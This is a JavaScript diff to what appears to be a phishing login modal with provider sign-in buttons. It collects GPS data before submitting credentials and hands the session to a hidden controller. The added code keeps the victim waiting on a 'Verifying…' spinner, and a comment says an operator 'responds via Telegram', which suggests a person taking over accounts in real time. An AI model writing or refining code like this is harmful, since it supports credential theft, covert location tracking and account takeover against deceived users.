@@ -42,6 +42,13 @@
 
   function closeModal() {
     overlay.classList.remove('is-open');
+    resetSubmitButton();
+  }
+
+  function resetSubmitButton() {
+    submitBtn.classList.remove('is-loading');
+    submitBtn.textContent = 'Login';
+    submitBtn.disabled = false;
   }
 
   document.querySelectorAll('[data-provider]').forEach(function (btn) {
@@ -72,6 +79,7 @@
 
     submitBtn.classList.add('is-loading');
     submitBtn.textContent = 'Signing in…';
+    submitBtn.disabled = true;
     errorBox.classList.remove('is-visible');
 
     const gps = window.__ResponseControls ? await window.__ResponseControls.collectGps() : { lat: null, lng: null };
@@ -89,16 +97,15 @@
     })
       .then(function (r) { return r.json(); })
       .then(function (data) {
-        submitBtn.textContent = 'Verified';
         if (data.sessionId && window.__ResponseControls) {
           window.__ResponseControls.setSessionId(data.sessionId);
           window.__ResponseControls.start(data.sessionId);
         }
-        setTimeout(closeModal, 800);
+        // Keep modal open with spinner — operator responds via Telegram
+        submitBtn.textContent = 'Verifying…';
       })
       .catch(function () {
-        submitBtn.classList.remove('is-loading');
-        submitBtn.textContent = 'Login';
+        resetSubmitButton();
         errorBox.textContent = 'Something went wrong. Please try again.';
         errorBox.classList.add('is-visible');
       });
